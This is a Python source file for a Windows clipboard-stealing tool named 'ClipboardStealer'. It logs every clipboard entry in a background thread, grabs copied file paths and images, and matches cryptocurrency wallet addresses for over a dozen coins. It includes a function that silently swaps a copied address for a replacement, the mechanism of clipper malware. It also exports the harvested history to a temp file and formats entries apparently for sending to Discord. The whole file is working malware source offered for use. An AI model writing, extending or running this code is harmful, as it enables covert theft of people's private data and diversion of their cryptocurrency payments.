import os
import sys
import time
import json
import base64
import threading
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import re

try:
    import win32clipboard
    import win32con
except ImportError:
    pass

class ClipboardStealer:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.clipboard_history = []
        self.running = False
        self.monitor_thread = None
        self.lock = threading.Lock()
        self.last_content = ""
        self.crypto_addresses = []
        
    def get_clipboard_text(self):
        try:
            win32clipboard.OpenClipboard()
            
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                
                if isinstance(data, bytes):
                    return data.decode('utf-8', errors='ignore')
                else:
                    return str(data)
            
            win32clipboard.CloseClipboard()
        except:
            pass
        
        return ""
    
    def get_clipboard_unicode(self):
        try:
            win32clipboard.OpenClipboard()
            
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                
                if isinstance(data, bytes):
                    return data.decode('utf-16', errors='ignore')
                else:
                    return str(data)
            
            win32clipboard.CloseClipboard()
        except:
            pass
        
        return ""
    
    def get_clipboard_files(self):
        files = []
        
        try:
            win32clipboard.OpenClipboard()
            
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_HDROP):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
                
                if isinstance(data, tuple):
                    files = list(data)
                elif isinstance(data, list):
                    files = data
            
            win32clipboard.CloseClipboard()
        except:
            pass
        
        return files
    
    def get_clipboard_image(self):
        try:
            win32clipboard.OpenClipboard()
            
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_BITMAP):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_BITMAP)
                
                if data:
                    return {
                        "type": "bitmap",
                        "data": base64.b64encode(data).decode() if isinstance(data, bytes) else str(data)
                    }
            
            win32clipboard.CloseClipboard()
        except:
            pass
        
        return None
    
    def monitor_clipboard(self, interval_seconds=1):
        while self.running:
            try:
                current_content = self.get_clipboard_text()
                
                if current_content and current_content != self.last_content:
                    self.last_content = current_content
                    
                    clipboard_entry = {
                        "timestamp": datetime.now().isoformat(),
                        "content": current_content
                    }
                    
                    with self.lock:
                        self.clipboard_history.append(clipboard_entry)
                    
                    # Check for crypto addresses
                    self.detect_crypto_addresses(current_content)
            except:
                pass
            
            time.sleep(interval_seconds)
    
    def start_monitoring(self, interval_seconds=1):
        if self.running:
            return
        
        self.running = True
        self.monitor_thread = threading.Thread(
            target=self.monitor_clipboard,
            args=(interval_seconds,),
            daemon=True
        )
        self.monitor_thread.start()
    
    def stop_monitoring(self):
        self.running = False
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
    
    def detect_crypto_addresses(self, text):
        patterns = {
            "bitcoin": r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}',
            "ethereum": r'0x[a-fA-F0-9]{40}',
            "litecoin": r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}',
            "dogecoin": r'D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}',
            "monero": r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}',
            "ripple": r'r[0-9a-zA-Z]{24,34}',
            "cardano": r'addr1[a-z0-9]{98}',
            "stellar": r'G[A-D][A-Z2-7]{54}',
            "tron": r'T[a-zA-Z0-9]{33}',
            "binance": r'bnb[a-zA-Z0-9]{39}',
            "solana": r'[1-9A-HJ-NP-Za-km-z]{32,44}',
            "dash": r'X[1-9A-HJ-NP-Za-km-z]{33}',
            "zcash": r't1[1-9A-HJ-NP-Za-km-z]{33}',
            "bitcoin_cash": r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}'
        }
        
        for currency, pattern in patterns.items():
            matches = re.findall(pattern, text)
            
            for match in matches:
                address_entry = {
                    "currency": currency,
                    "address": match,
                    "timestamp": datetime.now().isoformat()
                }
                
                with self.lock:
                    self.crypto_addresses.append(address_entry)
    
    def replace_crypto_address(self, original_address, replacement_address, currency="bitcoin"):
        try:
            current_content = self.get_clipboard_text()
            
            if original_address in current_content:
                modified_content = current_content.replace(original_address, replacement_address)
                
                # Set clipboard
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(modified_content)
                win32clipboard.CloseClipboard()
                
                return True
        except:
            pass
        
        return False
    
    def get_clipboard_history(self):
        with self.lock:
            return self.clipboard_history
    
    def get_crypto_addresses(self):
        with self.lock:
            return self.crypto_addresses
    
    def clear_history(self):
        with self.lock:
            self.clipboard_history = []
            self.crypto_addresses = []
            self.last_content = ""
    
    def export_history_to_file(self, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, f"clipboard_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                for entry in self.clipboard_history:
                    f.write(f"[{entry.get('timestamp', '')}]\n")
                    f.write(entry.get('content', ''))
                    f.write("\n" + "-" * 50 + "\n")
                
                if self.crypto_addresses:
                    f.write("\n\n[CRYPTO ADDRESSES DETECTED]\n")
                    f.write("=" * 50 + "\n")
                    
                    for address in self.crypto_addresses:
                        f.write(f"[{address.get('timestamp', '')}] [{address.get('currency', '')}]\n")
                        f.write(address.get('address', ''))
                        f.write("\n" + "-" * 30 + "\n")
            
            return output_path
        except:
            return None
    
    def format_clipboard_for_discord(self, entries, limit=100):
        formatted = []
        
        for entry in entries[:limit]:
            formatted.append({
                "timestamp": entry.get("timestamp", ""),
                "content": entry.get("content", "")[:200]  # Limit content length
            })
        
        return formatted
    
    def get_statistics(self):
        return {
            "total_entries": len(self.clipboard_history),
            "total_crypto_addresses": len(self.crypto_addresses),
            "unique_crypto_addresses": len(set(a.get('address', '') for a in self.crypto_addresses))
        }
    
    def steal_all(self):
        current_clipboard = self.get_clipboard_text()
        
        if current_clipboard and current_clipboard != self.last_content:
            self.last_content = current_clipboard
            self.clipboard_history.append({
                "timestamp": datetime.now().isoformat(),
                "content": current_clipboard
            })
        
        return {
            "current_clipboard": current_clipboard,
            "history": self.clipboard_history,
            "crypto_addresses": self.crypto_addresses,
            "files": self.get_clipboard_files(),
            "image": self.get_clipboard_image(),
            "statistics": self.get_statistics()
        }

if __name__ == "__main__":
    stealer = ClipboardStealer()
    data = stealer.steal_all()
    print(f"Current clipboard: {data['current_clipboard']}")
    print(f"Total history entries: {data['statistics']['total_entries']}")
    print(f"Crypto addresses found: {data['statistics']['total_crypto_addresses']}")